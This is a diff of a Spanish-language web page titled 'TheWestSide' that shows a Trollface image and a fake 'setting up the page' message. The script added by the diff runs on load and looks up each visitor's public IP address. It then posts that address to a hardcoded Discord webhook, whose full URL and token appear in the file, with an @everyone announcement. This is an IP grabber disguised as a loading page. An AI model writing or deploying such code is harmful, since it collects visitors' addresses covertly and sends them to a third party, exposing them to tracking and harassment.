@@ -3,50 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>TheWestSide</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+        }
+
+        h1 {
+            color: #333;
+            margin-top: 50px;
+        }
+
+        img {
+            width: 300px;
+            height: auto;
+            margin-top: 20px;
+        }
+
+        .loading {
+            font-size: 1.2em;
+            color: #007BFF;
+            margin-top: 30px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Configurando la pagina web...</h1>
-
-  
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRY7OOhDZDaP6YS-tOd1A0ArdgqOVAmQteIkQ&s" alt="Trollface" style="width: 300px; height: auto;">
+    <h1>Configurando la página web...</h1>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRY7OOhDZDaP6YS-tOd1A0ArdgqOVAmQteIkQ&s" alt="Trollface">
+    <p class="loading">Obteniendo la IP pública...</p>
 
     <script>
+        async function fetchUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                if (!response.ok) {
+                    throw new Error('Error al obtener la IP pública');
+                }
 
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-
+                const data = await response.json();
                 const userIP = data.ip;
                 console.log("La IP pública es: ", userIP);
 
-                const discordWebhookURL = 'https://discord.com/api/webhooks/1349832081617846374/uO95dOXo-h82EvBxM7Z7k79nIY33exHzNFmnS1ylvLxwjH7hyo0OlF92fmbUuL5Kria0';
+                await sendIPToDiscord(userIP);
+            } catch (error) {
+                console.error("Error al obtener la IP pública:", error);
+                document.querySelector('.loading').textContent = "No se pudo obtener la IP pública.";
+            }
+        }
 
-                const payload = {
-                    content: `@everyone ¡Alguien visitó tu página! La IP es: ${userIP}`
-                };
+        async function sendIPToDiscord(ip) {
+            const discordWebhookURL = 'https://discord.com/api/webhooks/1349832081617846374/uO95dOXo-h82EvBxM7Z7k79nIY33exHzNFmnS1ylvLxwjH7hyo0OlF92fmbUuL5Kria0';
 
-                fetch(discordWebhookURL, {
+            const payload = {
+                content: `@everyone ¡Alguien visitó tu página! La IP es: ${ip}`
+            };
+
+            try {
+                const response = await fetch(discordWebhookURL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify(payload)
-                })
-                .then(response => {
-                    if (response.ok) {
-                        console.log("IP enviada correctamente a Discord.");
-                    } else {
-                        console.error("Hubo un error al enviar la IP.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Error al enviar la IP a Discord: ", error);
                 });
-            })
-            .catch(error => {
-                console.error("Error al obtener la IP pública: ", error);
-            });
+
+                if (response.ok) {
+                    console.log("IP enviada correctamente a Discord.");
+                } else {
+                    console.error("Hubo un error al enviar la IP.");
+                }
+            } catch (error) {
+                console.error("Error al enviar la IP a Discord:", error);
+            }
+        }
+
+        // Iniciar el proceso de obtención y envío de IP
+        fetchUserIP();
     </script>
 </body>
 </html>
